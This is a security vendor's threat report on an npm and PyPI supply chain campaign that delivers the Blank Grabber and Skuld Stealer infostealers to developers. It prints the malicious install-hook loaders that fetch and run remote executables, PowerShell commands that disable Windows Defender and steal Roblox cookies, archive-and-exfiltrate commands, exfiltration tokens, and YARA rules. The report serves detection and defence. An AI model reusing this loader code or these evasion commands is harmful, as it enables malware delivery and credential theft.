@@ -1,0 +1,344 @@
+
+Key points and observations
+
+Datadog Security Research has discovered an ongoing supply chain attack targeting both the npm and PyPi package repositories.
+This is the first time we have observed the same threat actor targeting two different package ecosystems.
+Datadog is tracking this cluster of threat activity as MUT-8694.
+MUT-8694 uses a series of malicious packages to deliver infostealer malware to Windows users, and makes use of legitimate services, such as GitHub and repl.it, to host additional payloads.
+Based on the type of malware delivered and types of packages used, we have identified overlap in MUT-8694 with a similar campaign that researchers at Socket described.
+Overview
+Datadog’s CLI tool GuardDog is designed to detect malicious packages across PyPI, npm, and Go modules. On October 10 it identified a new threat within the PyPI ecosystem.
+The package was named larpexodus (version 0.1), and on investigation was found to execute a PowerShell command that downloaded and executed a Windows PE32 binary from github[.]com/holdthaw/main/CBLines.exe. Analysis of the binary confirmed it was infostealer malware, referred to as Blank Grabber, compiled from an open source project hosted on Github. Exploration of the GitHub repository revealed another commodity stealer sample, this time compiled from the open source Skuld Stealer project.
+After further analysis of our dataset, we found the same binary downloader in multiple packages hosted on npm, indicating a broader campaign involving multiple package ecosystems. The malicious packages on both npm and PyPi masquerade as legitimate packages, often through the use of typosquatting.
+Datadog is tracking this cluster of threat activity as MUT-8694. We use the MUT (mysterious unattributed threat) designation to track clusters unattributed to a known threat actor. The use of numerous packages and involvement of several malicious users suggests MUT-8694 is persistent in their attempts to compromise developers.
+Discovery
+On October 10, 2024, a malicious package with the name larpexodus was uploaded to PyPI. This package triggered a GuardDog alert, indicating that the code downloads and executes an externally hosted Windows binary, a method frequently used by malware. GuardDog designated the package as malicious and we began to analyze its contents.
+
+Below is the breakdown of the larpexodus package’s components:
+Package Metadata
+
+Name: larpexodus
+Version: 0.1
+Date Published: October 10, 2024
+Description: Empty
+Initial execution:  Custom installation code that is defined by a cmdclass setting in setup.py.
+In the days following this, GuardDog alerted us to additional malicious PyPI packages, which we were able to attribute to the same threat actor. The packages all contained the same code acting as a loader for the infostealer samples described above.
+We noticed that the PyPI package descriptions often suggested that the library was designed to resolve DLL- and API-related problems. Some packages had references to MuMu Player, an emulator used for playing games on Android phones and Apple silicon–based Macs, and others had references to Solara, a Python web application framework.
+Given the above, we have assessed with high confidence that MUT-8649 intends to target developers with this malware. That said, the PyPi packages did not appear to target developers of a particular stack or application. We discovered a total of 42 malicious packages related to this campaign in PyPi.
+After the initial discovery, GuardDog continued generating similar alerts, this time for packages that were labeled nodelogic and uploaded to the npm ecosystem.
+
+Below is the breakdown of the nodelogic package’s components:
+Package Metadata
+
+Name: nodelogic
+Version: 1.0.0
+Date Published: October 16, 2024
+Description: Advanced package used for easy API/DLL repair of any software.
+Initial execution: A post-installation hook that executes an obfuscated JavaScript version of the same attack method.
+We analyzed the code within the flagged npm packages and discovered that the malware was also retrieving the aforementioned infostealers from GitHub and repl.it, but this time the samples themselves were highly obfuscated. This led us to believe that we were dealing with a much bigger campaign than previously thought, and that MUT-8694 was coordinating a larger supply chain attack across multiple package ecosystems.
+Contrary to the PyPI ecosystem, most of the npm packages had references to Roblox, an online game creation platform, suggesting that the threat actor is targeting Roblox developers in particular. We discovered a total of 18 npm packages, details of which can be found in the Indicators of Compromise section.
+Technical analysis
+Initial access and execution
+As described previously, MUT-8694 hosts several malicious packages in both the npm and PyPi package ecosystems. Initial access is achieved when nodeJS or Python developers retrieve one of these malicious packages using the npm or pip commands respectively. Once the malicious package is retrieved, obfuscated code within the package is automatically executed. This code fetches the infostealer payloads from a number of different locations, depending on the package in question.
+For the npm packages, the loader code is contained within the package’s index.js file and is obfuscated with the popular open source obfuscator obfuscator.io. This obfuscator has several features designed to hinder analysis, including variable obfuscation, debug protection, dead code injection, and control flow flattening. Fortunately, the code can be easily deobfuscated using freely available tools.
+A truncated example of the obfuscated code can be seen below:
+const _0x48032e=_0x580a;(function(_0x17cd22,_0x1f7608){const _0x1e262d=_0x580a,_0x64a58c=_0x17cd22();while(!![]){try{const _0x50782e=-parseInt(_0x1e262d(0xd3))/(0xc33*-0x1+-0xd2f+-0x61*-0x43)+-parseInt(_0x1e262d(0xca))/(0xe*-0xad+-0x1d92+0x270a)+parseInt(_0x1e262d(0xef))/(-0x1fdd*-0x1+-0x499+-0x1b41)*(parseInt(_0x1e262d(0xdd))/(-0x8*0x3af+-0x7f7+-0x1*-0x2573))+-parseInt(_0x1e262d(0xd5))/(0x6b4+-0x4c0+-0x1ef*0x1)+-parseInt(_0x1e262d(0xee))/(-0x1131+0x1478+-0x77*0x7)*(parseInt(_0x1e262d(0xec))/(-0x1*-0x10af+0x257+0x1*-0x12ff))+-parseInt(_0x1e262d(0xce))/(-0x40f*0x7+-0xf78+0x4e1*0x9)*(-parseInt(_0x1e262d(0xc7))/(-0x173e+-0xa5*-0xd+0x2*0x773))+parseInt(_0x1e262d(0xe9))/(0x1a45+0x1d56+-0x3791)*(parseInt(_0x1e262d(0xed))/(0x3a7+-0x1e59+-0x1*-0x1abd));if(_0x50782e===_0x1f7608)break
+…
+After deobfuscating and prettifying the output, the functionality is evident. The malware first defines two GitHub URLs hosting additional binary payloads. A PowerShell command is then invoked to retrieve those payloads and save them to the current working directory (the directory of the package itself). Another PowerShell command is invoked to actually execute the binary.
+const path = require("path");
+const urls = ["https[://]github.com/holdthatcode/e/raw/main/CBLines.exe", "https[://]github.com/holdthatcode/e/raw/main/LoPi.exe"];
+const outputFiles = [path.join(__dirname, "CBLines.exe"), path.join(__dirname, "LoPi.exe")];
+function downloadAndRun(uri, binaryPath) {
+  const psh_retrieve_payload = "powershell -Command \"Invoke-WebRequest -Uri '" + uri + "' -OutFile '" + binaryPath + "'\"";
+  const psh_execute_payload = "powershell -Command \"Start-Process '" + binaryPath + "'\"";
+  exec(psh_retrieve_payload, (error, uri, binaryPath) => {
+    if (error) {
+      console.error("Download error: " + error.message);
+      return;
+    }
+    console.log("Downloaded " + binaryPath + " successfully");
+    exec(psh_execute_payload, (error, uri, binaryPath) => {
+      if (error) {
+        console.error("Execution error: " + error.message);
+        return;
+      }
+      console.log("Executed " + binaryPath + " successfully");
+    });
+  });
+}
+urls.forEach((url, path) => {
+  downloadAndRun(url, outputFiles[path]);
+});
+Pseudocode demonstrating logic to retrieve additional payloads
+The attacker has neglected to suppress console output for this procedure, resulting in log statements being written when the download succeeds or fails. This could be used as an indicator to potentially alert victims to the payload retrieval.
+The Python packages follow a similar procedure to the one described above. Code within the setup.py script for each package invokes PowerShell and uses the same commands seen previously to retrieve and execute the infostealer malware.
+Unlike their npm counterparts, loader scripts within the Python packages aren’t obfuscated. This makes it much easier to determine the functionality and identify the package as malicious. It’s unclear why the developer didn’t implement this feature for the Python packages when they did for the npm ones.
+class CustomInstallCommand(install):
+    """Custom installation script."""
+    def run(self):
+        output_file = os.path.join(os.getcwd(), "CBLines.exe")
+        
+        # Step 1: Download the file using PowerShell's Invoke-WebRequest
+        download_command = f"powershell -Command \"Invoke-WebRequest -Uri 'https://github.com/holdthatcode/e/raw/main/CBLines.exe' -OutFile '{output_file}'\""
+        download_result = subprocess.run(download_command, shell=True, text=True)
+
+        if download_result.returncode == 0 and os.path.exists(output_file):
+            print("Download successful. Now opening the file...")
+
+            # Step 2: Use Start-Process to open the downloaded MP3 file
+            open_command = f"powershell -Command \"Start-Process '{output_file}'\""
+            open_result = subprocess.run(open_command, shell=True, text=True)
+
+            print("Open Output:", open_result.stdout)
+            print("Open Error:", open_result.stderr)
+        else:
+            print("File download failed or file not found.")
+
+        # Call the standard install
+        install.run(self)
+Python loader code from larpexodus package
+Actions on objective
+As previously mentioned, the primary objective of the malicious packages is to retrieve infostealer malware. Of all the packages we have triaged, two malicious binaries have been discovered. These binaries are compiled from code taken from two open source projects: Blank Grabber and Skuld Stealer.
+In the npm and PyPi packages described above, Blank Grabber is delivered as a PE32 executable hosted on GitHub with the name CBLines.exe. The executable consists of Python code compiled using PyInstaller, and the name of the sample differs across packages. We’ve included a summary of the discovered names in the Indicators of Compromise section.
+The README page for Blank Grabber's GitHub repository suggests that the malware has some evasion capabilities, along with stealer code that targets Roblox cookies, crypto wallets, browser passwords, Telegram sessions, and more. The developers also claim that the malware can capture screenshots and webcam images and that all of this data can be exfiltrated via Discord webhooks or a Telegram bot.
+After execution, the malware copies itself to the user’s Temp directory (%AppData%\Local\Temp\) before re-executing itself. The malware will then execute the following PowerShell command:
+C:\WINDOWS\system32\cmd.exe /c "powershell -Command Add-MpPreference -ExclusionPath 'C:\Users\<user>\AppData\Local\Temp\CBLines.exe'"
+This command adds the malware’s executable to the Windows Defender exclusion list, preventing the EDR from scanning the file and identifying it as malware.
+A request is then made to the ip-api.com service to retrieve and store information about the victim’s public IP address. This includes geolocation of the IP and a reverse DNS lookup of the IP itself.
+{
+  "status": "success",
+  "country": "United Kingdom",
+  "regionName": "England",
+  "timezone": "Europe/London",
+  "reverse": "<redacted>",
+  "mobile": false,
+  "proxy": false,
+  "query": "<IP address>"
+}
+Sample response from ip-api.com
+After this has completed, another PowerShell command is used to disable more Windows Defender features:
+C:\WINDOWS\system32\cmd.exe /c "powershell Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && powershell Set-MpPreference -SubmitSamplesConsent 2 & "%ProgramFiles%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All"
+This includes the following:
+
+Defender Configuration Parameter	Description
+DisableIntrusionPreventionSystem $true	Disables network protection against known vulnerabilities
+DisableIOAVProtection $true	Disables Windows Defender feature to scan all downloaded files
+DisableRealtimeMonitoring $true	Disables heuristics and behavioral monitoring
+DisableScriptScanning $true	Prevents Defender from scanning scripts
+EnableControlledFolderAccess Disabled	Allow processes to access controlled folders
+EnableNetworkProtection AuditMode	Logs visits to malicious IPs or domains but doesn’t block the request itself
+MAPSReporting Disabled	Removes membership to the Microsoft Active Protections Program (MAPP)
+SubmitSamplesConsent NeverSend	Prevents submission to Microsoft of malware samples detected by Defender
+The malware also removes the definitions file used by Defender, via the MpCmdRun.exe command line utility, before executing the following system enumeration commands:
+
+Command	Description
+wmic os get Caption	Returns short description of operating system, including version number
+wmic computersystem get totalphysicalmemory	Displays the amount of RAM installed in the host
+wmic csproduct get uuid	Returns the hardware UUID of the host
+powershell Get-ItemPropertyValue -Path 'HKLM:SystemCurrentControlSetControlSession ManagerEnvironment' -Name PROCESSOR_IDENTIFIER	Returns the CPU name and architecture
+wmic path win32_VideoController get name	Returns the GPU name
+getmac	Returns the MAC address of the node’s network interface
+netsh wlan show profile	Displays WiFi profiles currently installed on the node, can be used to query WiFi passwords
+REG QUERY HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesTcpipParameters /DataBasePath	Returns location of Windows Hosts file
+systeminfo	Displays operating system configuration details
+tasklist /FO LIST	Produces a list of currently running processes
+WMIC /Node:localhost /Namespace:\rootSecurityCenter2 Path AntivirusProduct Get displayName	Displays installed antivirus products
+After completing this enumeration, Blank Grabber proceeds to the stealer functionality of the code. Since the code is modular and open source, the operator of the malware can configure its functionality to suit their campaign.
+In the sample we analyzed, MUT-8694 specifically targets Roblox browser cookies. This is achieved by reading the contents of a specific registry location using the following PowerShell command:
+powershell Get-ItemPropertyValue -Path HKCU:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY"
+Similar commands are used to retrieve the contents of the clipboard and a copy of the Windows product key. True to the functionality described on GitHub, Blank Grabber also has the ability to take screenshots on the host. The malware uses PowerShell to execute a base64 encoded payload, using the -EncodedCommand parameter. The decoded code takes a screenshot of all attached desktops and saves a PNG image of each to the current working directory.
+powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABzAG8AdQByAGMAZQAgAD0AIA…=
+
+PowerShell command to execute screenshotting code
+In addition to this, the sample we analyzed gathered files from the user's Desktop, Documents, Downloads, and Pictures folders, along with cookies and history from the Edge web browser, before bundling all of this data into a password-protected RAR archive for exfiltration. The following command was used to achieve this:
+"C:\Users\admin\AppData\Local\Temp\_MEI52842\rar.exe a -r -hp"blank" "C:\Users\admin\AppData\Local\Temp\ffzEL.zip" *
+The resulting RAR archive is exfiltrated via a Telegram bot using the name “blvnkbot” with a token of bot7546407054:AAGwtti94gRjmoXnuSTcg7u0_qsGj7uoXqo. More details of this can be found in the Indicators of Compromise section.
+Similar to Blank Grabber, Skuld Stealer has a modular architecture, but it is written in Go and targets Discord users on Windows. According to its GitHub repository, the malware has several features that make it effective as a stealer. These include mechanisms to evade Windows Defender, detect whether it’s running in a virtual machine, and persist itself as a startup item.
+Skuld Stealer begins by defining a user-generated Discord webhook URL, used for exfiltration of any credentials the malware gathers.
+Within the Discord webhook URL is a Snowflake identifier, which uniquely identifies resources on Discord. Using an online decoder, we can extract a timestamp from this identifier that tells us when the webhook URL was created:
+
+
+This creation date is around the same time as we started to receive GuardDog alerts about this campaign.
+Examining the rest of the malware’s main function in our disassembler shows us which modules MUT-8694 has opted to include in their build of the stealer. These are summarized in the table below.
+
+Skuld Stealer Module	Description
+github_com_hackirby_skuld_modules_uacbypass_Run	UAC bypass mechanism using the fodhelper.exe method
+github_com_hackirby_skuld_modules_hideconsole_Run	Hides the cmd.exe console window upon execution
+github_com_hackirby_skuld_modules_antivm_Run	Queries various Windows APIs and environment variables to determine whether the sample is running in a VM
+github_com_hackirby_skuld_modules_antidebug_Run	Uses Windows API calls like IsDebuggerPresent and a hardcoded list of debuggers to evade debugging
+github_com_hackirby_skuld_modules_antivirus_Run	Disables Windows Defender and blocks access to sites hosted by popular AV and EDR products
+github_com_hackirby_skuld_modules_fakeerror_Run	Generates a dialogue containing a fake error message. See screenshot below
+github_com_hackirby_skuld_modules_browsers_Run	Steals credentials, history, and payment information from Gecko and Chromium browsers
+github_com_hackirby_skuld_modules_tokens_Run	Enumerates file system paths known to contain Discord and browser authentication tokens
+github_com_hackirby_skuld_modules_discodes_Run	Searches for files named “discord_backup_codes,” which are known to contain Discord 2FA backup codes
+github_com_hackirby_skuld_modules_commonfiles_Run	Searches for sensitive files with extensions like .txt, .xls, .ppt and strings like “password,” “secret,” and “accounts” in the filename
+github_com_hackirby_skuld_modules_wallets_Run	Attempts to steal data from popular cryptocurrency wallets, including Exodus, Ethereum, and Electrum
+github_com_hackirby_skuld_modules_games_Run	Enumerates AppData locations for various games, attempts to steal sensitive information from those locations
+github_com_hackirby_skuld_modules_clipper_Run	Intercepts clipboard requests containing cryptocurrency wallet addresses, replaces the address with an attacker-controlled one
+github_com_hackirby_skuld_modules_walletsinjection_Run	Attempts to intercept passphrases from Exodus and Atomic cryptocurrency wallets
+github_com_hackirby_skuld_modules_discordinjection_Run	Exploits Discord application files and databases to intercept credentials and 2FA codes
+github_com_hackirby_skuld_modules_startup_Run	Ensures persistence by copying the Skuld Stealer binary to \Microsoft\Protect\SecurityHealthSystray.exe" and adding this path to Software\Microsoft\Windows\CurrentVersion\Run" for the current user. The task is registered with the name “Realtek HD Audio Universal Service" to make it less conspicuous
+How Datadog can help
+Datadog Software Composition Analysis (SCA) customers can easily verify if this package is installed in their infrastructure by running this query in the Library Risks explorer.
+If you discover your system is impacted, consider what credentials and underlying infrastructure could be affected. It is important to take immediate measures such as rotating credentials, isolating the application, and investigating potential spread.
+We also published the packages to our open-source malicious package dataset.
+Detection Opportunities with YARA
+We are sharing two YARA rules that can be used to detect similar npm and PyPI packages based on telegram exfiltration and obfuscation behaviours
+rule HUNT_FILE_Telegram_Bot_API_Commands
+{
+    meta:
+        description = "Detects Telegram bot API commands"
+        author = "Andy Giron, Datadog"
+        date = 11/20/2024
+
+    strings:
+        $telegram_api_base = "https://api.telegram.org/bot" ascii
+        $token_pattern = /[0-9]{7,10}:[A-Za-z0-9_-]{35}/  
+
+
+        $command_getMe = "/getMe" ascii
+        $command_getUpdates = "/getUpdates" ascii
+        $command_getWebhookInfo = "/getWebhookInfo" ascii
+        $command_deleteWebhook = "/deleteWebhook" ascii
+        $command_drop_updates = "/deleteWebhook?drop_pending_updates=true" ascii
+
+        $identifier_chat_id = "chat_id" ascii
+
+    condition:
+        1 of ($telegram_api_base, $token_pattern) and 1 of ($command_getMe, $command_getUpdates, $command_getWebhookInfo, $command_deleteWebhook, $command_drop_updates, $identifier_chat_id)
+}
+rule HUNT_FILE_Obfuscation_JS_HexFunctionPattern
+{
+    meta:
+        description = "Detects JavaScript obfuscation patterns involving hex functions and array manipulation in obfuscated code"
+        author = "Andy Giron, Datadog"
+        date = 11/20/2024
+
+    strings:
+        $obfuscation_pattern = /\(?function\s*_?0x[0-9a-fA-F]{1,8}\(/ ascii
+
+        $array_push = /\['push'\]/ ascii
+        $array_shift = /\['shift'\]/ ascii
+        $hex_array = /\[0x[0-9a-fA-F]{2,8}(,0x[0-9a-fA-F]{2,8}){10,}\]/ ascii
+
+    condition:
+        $obfuscation_pattern and
+        (1 of ($array_push, $array_shift, $hex_array))
+}
+Conclusion
+In conclusion, MUT-8694 is a persistent threat actor with the ability to orchestrate a coordinated supply chain attack across both npm and PyPi ecosystems. This extensive operation underscores the ongoing risk that threat actors pose to open source package repositories, highlighting the importance of robust security measures among developers using these ecosystems.
+Our findings indicate the involvement of a single threat actor exploiting multiple platforms with similar techniques, such as typosquatting and leveraging legitimate services like GitHub for hosting malicious payloads. The repeated use of obfuscation and the employment of both publicly available infostealers—Blank Grabber and Skuld Stealer—illustrate the adaptability and persistence of this threat actor, as well as their focus on targeting gaming communities and Discord users for credential theft and crypto-related exploits.
+As we continue to track this threat actor, we aim to shed more light on the tactics, techniques, and procedures (TTPs) of MUT-8694, highlighting the ongoing threat to supply chain security.
+Indicators of Compromise
+Files
+
+Filename	SHA256
+CBLines.exe (Blank Grabber)	9247039186ec01688d19be3ade8e18fa086301145b7c00cc24465147764c63b8
+RobloxPlayerLauncher.exe (Skuld Stealer)	5c4c6ef3aed460f7ea15025bc160768e00c988747b943c99faf9f09b73f86e18
+cmd.exe (Blank Grabber)	b3ce55c72f4e23252235f9698bd6078880ceaca310ba16ee859a5a2d6cc39a92
+URLs
+
+URL	Description
+https://github[.]com/holdthatcode/e/raw/main/CBLines.exe	GitHub repository hosting Blank Grabber
+https://eed964e7-461c-4428-9c46-808d77ede57c-00-26f8c6izoatcc.worf.replit[.]dev/skuld	Replit URL hosting Skuld Stealer
+https://eed964e7-461c-4428-9c46-808d77ede57c-00-26f8c6izoatcc.worf.replit[.]dev/blank	Replit URL hosting Blank Grabber
+https://eed964e7-461c-4428-9c46-808d77ede57c-00-26f8c6izoatcc.worf.replit[.]dev/empyrean	Replit URL hosting Skuld Stealer
+https://discord[.]com/api/webhooks/1296197362108338248/k492vQ1I3SDXcmvWcvsy2EcSUzrwhNmILrYhR3qSF8R7tkcE-C5GgZSxuS3IlNschBWg	Discord webhook URL for Skuld Stealer exfiltration
+https://api.telegram[.]org/bot7546407054:AAGwtti94gRjmoXnuSTcg7u0_qsGj7uoXqo/getUpdates	Telegram bot URL for Blank Grabber exfiltration
+https://api.telegram[.]org/bot7546407054:AAGwtti94gRjmoXnuSTcg7u0_qsGj7uoXqo/getWebhookInfo	Telegram bot URL for Blank Grabber exfiltration
+https://api.telegram[.]org/bot7546407054:AAGwtti94gRjmoXnuSTcg7u0_qsGj7uoXqo/getMe	Telegram bot URL for Blank Grabber exfiltration
+Malicious Packages
+
+Package Name and Version	Ecosystem
+embeds (0.0.1)	PyPI
+dahood (0.0.3)	PyPI
+modeflow (0.0.1, 0.1.0)	PyPI
+pyadd (0.1.0, 0.1.1, 0.1.2)	PyPI
+pyloy (0.0.1)	PyPI
+uidesign (0.0.1)	PyPI
+automsg (0.0.1)	PyPI
+ezauto (0.0.1)	PyPI
+artindex (0.0.1)	PyPI
+rolib (0.0.1)	PyPI
+roinject (0.0.1)	PyPI
+rodll (0.0.1)	PyPI
+antibyfron (0.0.1)	PyPI
+pysleek (0.0.1)	PyPI
+pyvantq (0.0.1)	PyPI
+cblines (0.0.1)	PyPI
+cryptocalls (0.0.1)	PyPI
+websend (0.0.1)	PyPI
+pykane (0.0.1)	PyPI
+discould (0.0.1)	PyPi
+pycblines (0.0.1)	PyPi
+pytskcheck (0.0.1)	PyPi
+pysolara (0.0.1)	PyPi
+pytkit (0.0.1)	PyPi
+lowui (0.0.1)	PyPi
+mumupatcher (0.0.1)	PyPi
+mumuplayer12 (0.0.1)	PyPi
+haaahhaha (0.1)	PyPi
+hahahasillyxd (0.1)	PyPi
+xsilyxd (0.1)	PyPi
+larpexodus (0.1)	PyPi
+solaraund (0.1)	PyPi
+nezur (0.1)	PyPi
+pymatcha (0.1)	PyPi
+partpyth (0.1)	PyPi
+pyaacv (0.1)	PyPi
+pydllcfg (0.1)	PyPi
+pycordapi (0.1)	PyPi
+pydeobf (0.1)	PyPi
+nodelogic (1.0.0, 1.0.1)	npm
+node-dlls (1.0.0)	npm
+roblox.dll (1.0.0)	npm
+bloxbootstrap (1.0.0)	npm
+testinbro (1.0.0)	npm
+robloxbootstrapper (1.0.0)	npm
+bloxupgrade (1.0.0)	npm
+solaraupdater (1.0.0)	npm
+easy-upgrade (1.0.1)	npm
+getsolara (1.0.1)	npm
+hwidrefresh (1.0.0)	npm
+robloxmatcher (1.0.0)	npm
+e39testing (1.0.0)	npm
+e39test (1.0.0)	npm
+permissionscaling (1.0.0)	npm
+lvbypasser (1.0.0)	npm
+rivalsgui (1.0.0)	npm
+powerupdate (1.0.0)	npm
+larpexodus
+larpexodus
+larpexodus
+cmdclass
+setup.py
+nodelogic
+nodelogic
+npm
+pip
+C:\WINDOWS\system32\cmd.exe /c "powershell -Command Add-MpPreference -ExclusionPath 'C:\Users\<user>\AppData\Local\Temp\CBLines.exe'"
+DisableIntrusionPreventionSystem $true
+DisableIOAVProtection $true
+DisableRealtimeMonitoring $true
+DisableScriptScanning $true
+EnableControlledFolderAccess Disabled
+EnableNetworkProtection AuditMode
+MAPSReporting Disabled
+SubmitSamplesConsent NeverSend
+wmic os get Caption
+wmic computersystem get totalphysicalmemory
+wmic csproduct get uuid
+powershell Get-ItemPropertyValue -Path 'HKLM:SystemCurrentControlSetControlSession ManagerEnvironment' -Name PROCESSOR_IDENTIFIER
+wmic path win32_VideoController get name
+getmac
+netsh wlan show profile
+REG QUERY HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesTcpipParameters /DataBasePath
+systeminfo
+tasklist /FO LIST
+WMIC /Node:localhost /Namespace:\rootSecurityCenter2 Path AntivirusProduct Get displayName
+powershell Get-ItemPropertyValue -Path HKCU:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY"
+-EncodedCommand
+powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABzAG8AdQByAGMAZQAgAD0AIA…=
+"C:\Users\admin\AppData\Local\Temp\_MEI52842\rar.exe a -r -hp"blank" "C:\Users\admin\AppData\Local\Temp\ffzEL.zip" *
+bot7546407054:AAGwtti94gRjmoXnuSTcg7u0_qsGj7uoXqo
+IsDebuggerPresent
